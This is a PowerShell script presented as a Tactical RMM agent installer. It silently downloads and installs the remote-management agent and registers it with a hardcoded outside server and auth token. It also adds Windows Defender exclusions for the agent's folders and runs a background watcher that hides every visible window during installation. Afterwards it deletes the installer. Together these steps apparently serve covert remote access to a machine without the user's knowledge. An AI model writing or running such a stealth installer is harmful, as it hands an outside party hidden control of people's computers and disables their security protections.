<#
    Tactical RMM Installer v2.12.0
    Author: Updated for Zero Popups
#>
[CmdletBinding()]
param()

$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

# === CONFIGURATION ===
$api       = "https://api.dylanservers.top"
$clientid  = "1"
$siteid    = "1"
$agenttype = "server"
$auth      = "dd9052c2685252cfd79a37a459bc3e35543e5b92114068ffd85214704167ff76"

$innosetup = "tacticalagent-v2.12.0-windows-amd64.exe"
$downloadlink = "https://github.com/amidaware/rmmagent/releases/download/v2.12.0/tacticalagent-v2.12.0-windows-amd64.exe"
$OutPath = $env:TMP
$outputFile = Join-Path $OutPath $innosetup
$serviceName = 'tacticalrmm'

# --- 1. NETWORK CHECK ---
Write-Host "Checking Network..." -ForegroundColor Cyan
$serverHost = ([System.Uri]$api).Host
$connectResult = $null
$tries = 0
do {
    $connectResult = Test-NetConnection -ComputerName $serverHost -Port 443 -ErrorAction SilentlyContinue
    if (-not $connectResult) { Start-Sleep -Seconds 5; $tries++ }
} until ($connectResult.TcpTestSucceeded -or $tries -eq 3)
if (-not $connectResult.TcpTestSucceeded) { Exit 1 }

# --- 2. DOWNLOAD ---
Write-Host "Downloading..." -ForegroundColor Cyan
Try {
    Invoke-WebRequest -Uri $downloadlink -OutFile $outputFile -UseBasicParsing -TimeoutSec 60
    Unblock-File -Path $outputFile
} Catch {
    Write-Host "Download Failed"
    Exit 1
}

# --- 3. DEFENDER EXCLUSIONS ---
Add-MpPreference -ExclusionPath 'C:\Program Files\TacticalAgent\*'
Add-MpPreference -ExclusionPath 'C:\ProgramData\TacticalRMM\*'

# --- 4. AGGRESSIVE WINDOW HIDER (WATCHER) ---
# This background script actively hides any window that pops up during install
$watcherRunspace = [System.Management.Automation.Runspaces.RunspaceFactory]::CreateRunspace()
$watcherRunspace.Open()
$watcherPS = [System.Management.Automation.PowerShell]::Create()
$watcherPS.Runspace = $watcherRunspace

[void]$watcherPS.AddScript({
    Add-Type @"
    using System; using System.Runtime.InteropServices;
    public class WinApi {
        [DllImport("user32.dll", SetLastError=true, CharSet=CharSet.Auto)] 
        public static extern IntPtr FindWindow(string className, string windowText);
        [DllImport("user32.dll", SetLastError=true)] 
        public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
        [DllImport("user32.dll", SetLastError=true)] 
        public static extern int SetWindowLong(IntPtr hWnd, int nIndex, int dwNewLong);
        [DllImport("user32.dll", SetLastError=true)] 
        public static extern int GetWindowLong(IntPtr hWnd, int nIndex);
    }
"@
    $timeout = (Get-Date).AddMinutes(2)
    while ((Get-Date) -lt $timeout) {
        # Hide "Setup of ..." or "Tactical" windows
        Get-Process | Where-Object {$_.MainWindowHandle -ne [IntPtr]::Zero} | ForEach-Object {
            $h = $_.MainWindowHandle
            # Find Window by text is hard, so we check common titles
            # If we can't check title, we just hide it based on process name if needed.
            # Here we try to find "Tactical" or "Setup"
            # Simplest way: Hide Window by Handle if it has visible styles
            try {
                $style = [WinApi]::GetWindowLong($h, -16) # GWL_STYLE
                # If WS_VISIBLE (0x10000000) is set, hide it
                if (($style -band 0x10000000) -ne 0) {
                     [WinApi]::ShowWindow($h, 0)
                }
            } catch {}
        }
        Start-Sleep -Milliseconds 100
    }
})
$watcherPS.BeginInvoke() | Out-Null

# --- 5. RUN INSTALLER (Silent) ---
Write-Host "Installing..." -ForegroundColor Cyan
Start-Process -FilePath $outputFile -ArgumentList '/VERYSILENT /NORESTART /SUPPRESSMSGBOXES /SP-' -WindowStyle Hidden -Wait

Write-Host "Waiting for extraction..." -ForegroundColor Gray
Start-Sleep -Seconds 10

# --- 6. LOCATE & REGISTER ---
$agentPaths = @(
    "C:\Program Files\TacticalAgent\tacticalrmm.exe",
    "C:\Program Files (x86)\TacticalAgent\tacticalrmm.exe"
)
$agentExePath = $null

foreach ($p in $agentPaths) {
    if (Test-Path $p) {
        $agentExePath = $p
        break
    }
}

if (-not $agentExePath) {
    # Fallback: Search the folder for any .exe if standard path failed
    $found = Get-ChildItem "C:\Program Files\TacticalAgent\" -Filter "*.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
    if ($found) { $agentExePath = $found.FullName }
}

Write-Host "Registering Agent..." -ForegroundColor Cyan
$installArgs = @('-m', 'install', '--api', $api, '--client-id', $clientid, '--site-id', $siteid, '--agent-type', $agenttype, '--auth', $auth)

Try {
    if ($agentExePath) {
        Start-Process -FilePath $agentExePath -ArgumentList ($installArgs -join " ") -WindowStyle Hidden -Wait
    }
} Catch {
    Write-Host "Registration error: $_"
}

# Cleanup
$watcherPS.Stop() | Out-Null
$watcherRunspace.Close() | Out-Null
Remove-Item -Path $outputFile -Force -ErrorAction SilentlyContinue

Write-Host "Done."
Exit 0
